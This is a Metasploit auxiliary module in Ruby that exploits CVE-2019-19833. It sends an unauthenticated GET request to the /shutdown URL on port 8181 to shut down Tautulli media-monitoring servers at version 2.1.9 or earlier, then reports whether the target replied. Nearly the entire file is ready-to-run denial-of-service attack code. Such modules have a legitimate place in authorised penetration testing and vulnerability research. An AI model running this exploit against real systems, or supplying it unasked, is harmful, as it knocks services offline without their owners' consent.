##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name'        => 'Tautulli v2.1.9 - Shutdown Denial of Service',
      'Description' => 'Tautulli versions 2.1.9 and prior are vulnerable to denial of service via the /shutdown URL.',
      'Author'      => 'Ismail Tasdelen',
      'License'     => MSF_LICENSE,
      'References'  =>
      [
        ['CVE', '2019-19833'],
        ['EDB', '47785']
      ]
    )
    register_options([ Opt::RPORT(8181) ])
  end

  def run
    res = send_request_raw({
      'method' => 'GET',
      'uri' => '/shutdown'
    })

    if res
      print_status("Request sent to #{rhost}")
    else
      print_status("No reply from #{rhost}")
    end
  rescue Errno::ECONNRESET
    print_status('Connection reset')
  end
end
